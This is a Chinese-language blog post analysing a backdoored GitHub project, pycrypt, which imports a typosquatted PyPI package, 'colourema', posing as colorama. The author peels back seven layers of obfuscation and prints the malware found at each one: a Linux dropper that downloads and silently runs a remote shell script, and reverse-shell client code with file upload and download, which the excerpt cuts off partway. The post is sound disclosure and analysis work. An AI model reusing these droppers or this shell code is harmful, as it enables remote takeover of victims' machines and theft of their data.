---
title: 针对"红队人员"的Github项目投毒发现及分析
url: https://www.svenbeast.com/post/ZVscVsf50/
source: 攻城肾透shi | sv3nbeast
date: 2023-01-11
fetch_date: 2025-10-04T03:28:31.307731
---

# 针对"红队人员"的Github项目投毒发现及分析

[攻城肾透shi | sv3nbeast](https://www.svenbeast.com)

[首页](/)
[📃文章列表](/posts)
[📖归档](/archives)
[🏷️标签](/tags)
[🔥关于](/post/about)
[ ]

[攻城肾透shi | sv3nbeast](https://www.svenbeast.com)

Dark

\u6697\u9ED1

☰ Menu

☰ 菜单

[首页](/)
[📃文章列表](/posts)
[📖归档](/archives)
[🏷️标签](/tags)
[🔥关于](/post/about)

# 针对"红队人员"的Github项目投毒发现及分析

Author:
[斯文](/)

Date: 2023-01-10
Reading Time:8.1 mins
words:1715

Category:
[投毒](https://www.svenbeast.com/tag/OxRsFB6QU/)
[加解密](https://www.svenbeast.com/tag/e28LCxcc5/)
[笔记](https://www.svenbeast.com/tag/rwt8EXIMSg/)

share:

作者:
[斯文](/)
日期: 2023-01-10
阅读时间:8.1 分钟
字数:1715
分类:
[投毒](https://www.svenbeast.com/tag/OxRsFB6QU/)
[加解密](https://www.svenbeast.com/tag/e28LCxcc5/)
[笔记](https://www.svenbeast.com/tag/rwt8EXIMSg/)

分享:

### 0x01 发现背景

"阳康"后在github闲逛时发现同事star了一个后处理免杀项目，看描述说可以绕过任何类型的防病毒产品，自然我也对项目产生了一些兴趣，遂开始查看项目代码并由此开启了本次的投毒项目分析。

**PS：此前并未在其他渠道发现本次分析项目的预警**

![](https://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/202301031056734.png)

### 0x02 分析过程

#### 2.1 项目地址

文章编写时项目还在正常运行，我将其保存在了快照网站，若后面项目删除方便继续查看

```
https://github.com/machine1337/pycrypt
https://web.archive.org/web/20230103031922/https://github.com/machine1337/pycrypt
```

![image-20230103111752755](https://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/202301031117797.png)

#### 2.2 发现异常

项目的介绍较长且附带视频，整体并无异常，在查看代码准备了解实现原理时发现异常，其导入了一个异常的依赖库colourema，有一些PY代码编写基础的朋友应该知道修改终端颜色的依赖库叫做colorama，那么很明显这里可能存在一些问题

![image-20230103112510293](https://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/202301031125330.png)

#### 2.3 定位后门

在pypi的依赖库介绍中，colourema的介绍有3000+star,实际链接却为colorama，到此确定此依赖库存在后门。

![image-20230103113239031](https://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/202301031132061.png)

通过对依赖库代码进行查看，因担心使用vscode存在一些风险，使用sublime打开，最后于initialise.py文件中发现后门代码

![image-20230103113549664](https://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/202301031135692.png)

#### 2.4 后门代码

##### 2.4.1 一层加密

###### 加密代码

![image-20230103124756511](https://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/202301031247546.png)

###### 解密后代码

```
import os,platform,subprocess
if platform.system().startswith("Linux"):
        try:
            with open('/tmp/file.py', 'w') as f:
                f.write("import os \nimport subprocess \nfrom pathlib import Path \nfrom urllib import request \nhello = os.getlogin() \nPATH = '/home/' + hello + '/.msfdb/update'\nPAT  = '/tmp/file.py'\nisExist = os.path.exists(PATH) \nif not isExist:\n        os.makedirs(PATH) \nif Path(PATH).is_file(): \n           print("") \nelse: \n")
                f.write("     remote_url ='https://dl.dropboxusercontent.com/s/bpf0cfzf2h576o3/mozila.sh'\n     local_file = PATH+'/.path.sh' \n     request.urlretrieve(remote_url, local_file) \n     subprocess.call(\"bash /home/$USER/.msfdb/update/.path.sh >/dev/null 2>&1\", shell=True) \n")
                f.write("     if Path(PAT).is_file(): \n         try:\n           os.remove(PAT)\n         except:\n           print()")
        except FileNotFoundError:
            print("")
        subprocess.call("python3 /tmp/file.py &", shell=True)
```

##### 2.4.2 二层加密

上面代码下载并运行了此链接的sh文件，同样保存在了web.archive.org中，后续的相关文件也是如此，方便后续其他感兴趣的师傅复查

```
#sh文件中继续中转发现一层加密
https://dl.dropboxusercontent.com/s/bpf0cfzf2h576o3/mozila.sh
#加密代码链接
https://dl.dropboxusercontent.com/s/n7xl8ki0k9xqt7x/update.py
```

![image-20230103125220855](https://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/202301031252892.png)

###### 加密代码

![image-20230103125351143](https://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/202301031253177.png)

###### 解密后代码

```
fpyepsdb = chr(105)
zbieto = chr(109) + chr(112) + chr(111) + chr(114) + chr(116) + chr(32) + chr(98) + chr(97)
ontxmpdwi = chr(115) + chr(101) + chr(54) + chr(52) + chr(59) + chr(101) + chr(120) + chr(101)
rdnpqwkiz = chr(99) + chr(40) + chr(39) + chr(39) + chr(46) + chr(106) + chr(111) + chr(105)
qvjlktvg = chr(110) + chr(40) + chr(91) + chr(121) + chr(91) + chr(48) + chr(93) + chr(32)
nqsokf = chr(102) + chr(111) + chr(114) + chr(32) + chr(120) + chr(32) + chr(105) + chr(110)
...
同样是很长的一段加密字符串
...
qytpmsygab = ""
qytpmsygab += fpyepsdb
qytpmsygab+= zbieto + ontxmpdwi
...
同样是很长的一段加密字符串
...
qytpmsygab+= xpcexvz + yslqs
exec(qytpmsygab)
```

##### 2.4.3 三层加密

###### 加密代码

上一步解密后代码中的那段很长的加密字符串

![image-20230103142850323](https://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/202301031428402.png)

###### 解密后代码

```
import base64;
exec(''.join([y[0] for x in [x for x in base64.b64decode( ('同样是很长的一段加密字符串').encode('ascii') ).decode('ascii')] for y in [[x[0], x[1]] for x in {'\t': '6', '\n': 'R', ' ': 'U', '!': 'Y', '@': 'i', '~': 'n', '`': 'Q', '#': '7', '$': 'A', '%': 'E', '^': '$', '&': 'o', '*': 'm', '(': '!', ')': '/', '_': '~', '=': 'L', '-': 'h', '+': ')', '{': 'N', '}': 'O', '|': '\\', '\\': 'g', '[': 'S', ']': '+', ':': 'z', ';': '|', '"': 's', "'": '`', ',': '{', '.': 'F', '/': ']', '?': '2', '>': 'y', '<': 'l', '0': '%', '1': 'W', '2': 'H', '3': 'c', '4': '\n', '5': 'x', '6': 'Z', '7': '.', '8': '>', '9': 'K', 'a': '<', 'b': 'V', 'c': '(', 'd': 'B', 'e': ';', 'f': 'u', 'g': "'", 'h': 'p', 'i': 'w', 'j': '3', 'k': '}', 'l': '1', 'm': 't', 'n': 'k', 'o': '9', 'p': '?', 'q': 'M', 'u': 'q', 'r': 'a', 's': '0', 't': '\t', 'v': 'J', 'w': '=', 'x': 'T', 'y': '_', 'z': 'G', 'A': '[', 'B': '&', 'C': '4', 'D': '-', 'E': '@', 'F': 'e', 'G': '^', 'H': 'f', 'I': '8', 'J': '*', 'K': 'D', 'L': '#', 'M': 'C', 'N': ' ', 'O': 'b', 'P': 'P', 'Q': 'X', 'U': ',', 'R': '"', 'S': 'd', 'T': 'j', 'V': 'I', 'W': 'v', 'X': '5', 'Y': ':', 'Z': 'r'}.items()] if x == y[1]]))
```

##### 2.4.4 四层加密

###### 加密代码

上一步解密后代码中的那段很长的加密字符串

![image-20230103143156290](https://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/202301031431353.png)

###### 解密后代码

```
from cryptography.fernet import Fernet

encrypted_message = '同样是很长的一段加密字符串'
key = b'fFdnVFFLuGqYOndl9Xvp9pRnOenZ__grZS5sFssfiX4='

f = Fernet(key)
decrypted_message = f.decrypt(encrypted_message.encode())
exec(decrypted_message.decode())
```

##### 2.4.5 五层加密

###### 加密代码

上一步解密后代码中的那段很长的加密字符串

![image-20230103143112622](https://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/202301031431707.png)

###### 解密后代码

```
import codecs
exec(codecs.decode(b'同样是很长的一段加密字符串', "hex").decode())
```

##### 2.4.6 六层加密

###### 加密代码

上一步解密后代码中的那段很长的加密字符串

![image-20230103143048939](https://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/202301031430009.png)

###### 解密后代码

```
import gzip

code = b"同样是很长的一段加密字符串".decode()
exec(gzip.decompress(code.encode('cp437')).decode())
```

##### 2.4.7 七层加密

###### 加密代码

![image-20230103143015389](https://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/202301031430457.png)

###### 解密后代码

```
import socket
import json
import subprocess
import time
import os
import sys
def reliable_send(data):
    jsondata = json.dumps(data)
    s.send(jsondata.encode())
def reliable_recv():
    data = ''
    while True:
        try:
            data = data + s.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue
def download_file(file_name):
    f = open(file_name, 'wb')
    s.settimeout(2)
    chunk = s.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = s.recv(1024)
        except socket.timeout as e:
            break
    s.settimeout(None)
    f.close()
def upload_file(file_name):
    f = open(file_name, 'rb')
    s.send(f.read())
def shell():
    while True:
        command = reliable_recv()
        if command == 'quit':
            break
        elif command == 'background':  # BEGIN
            pass
        elif command == 'help':  # ideally to be removed
            pass
        elif command == 'clear':
            pass  # END
        elif command[:3] == 'cd ':
            os.chdir(command[3:])
        elif command[:6] == 'upload':
            download_file(command[7:])
        elif command[:8] == 'download':
            upload_file(command[9:])
        elif command[:7] == 'sendall':
            subprocess.Po...